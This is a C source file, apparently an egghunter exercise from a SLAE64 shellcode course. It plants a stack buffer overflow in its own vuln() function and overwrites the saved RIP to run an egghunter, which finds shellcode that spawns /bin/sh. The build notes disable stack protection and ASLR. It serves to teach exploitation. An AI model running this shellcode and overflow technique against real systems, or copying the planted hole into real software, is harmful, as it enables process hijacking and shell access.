/* Author : SLAE64-PA-6470 (kahlon81) */
/* Date : 2018/02/21 */
/* Tested on Ubuntu 12.04 LTS */
/* Compile: gcc -fno-stack-protector -z execstack egghunter.c -o egghunter */
/* Disable ASLR: echo 0 > /proc/sys/kernel/randomize_va_space           */

#include <stdio.h>
#include <string.h>
#include <unistd.h>

// Exploit buffer overflow overwriting RIP (RIP will be set in little endian order)
unsigned char buffer_overflow[400];
unsigned char overflow[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

/*
 * Search for EGG which is SLAE
 */
unsigned char egghunter[] =
"\x48\x8D\x0D\x00\x00\x00\x00" 	// lea rcx, [rip]
"\x48\x83\xc1\x19"  		// add rcx, 0xff
"\x48\xff\xc1"  		// inc rcx
"\x81\x79\xfc\x53\x4c\x41\x45" 	// cmp DWORD PTR [rcx-0x4], EGG
"\x75\xf4"  			// jne -6
"\xff\xe1";  			// jmp rcx


unsigned char shellcode[] = "SLAE" // EGG
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";


int vuln() {
    char buf[80];
    memcpy(buf, buffer_overflow, 400);
}

void set_buffer_overflow() {
   int ov_size = sizeof(overflow);
   unsigned char rip[8];

   // Get egghunter address
   unsigned long sc_addr = (unsigned long)&egghunter;

   // Convert unsigned long egghunter address to an array of char
   int i;
   char adr[sizeof(unsigned long)];
   for(i = 0; i < sizeof(unsigned long); ++i)
   {
       adr[i] = sc_addr & 0xff;
       rip[i] = adr[i];
       sc_addr >>= 8;
   }

   // set buffer overflow
   memcpy(buffer_overflow, overflow, ov_size);

   // Ovverride RIP address
   memcpy(buffer_overflow + ov_size - 1, rip, 8);
}


int main(int argc, char *argv[]) {
    printf("Try to exec shellcode\r\n");

    set_buffer_overflow();
    vuln();

    return 0;
}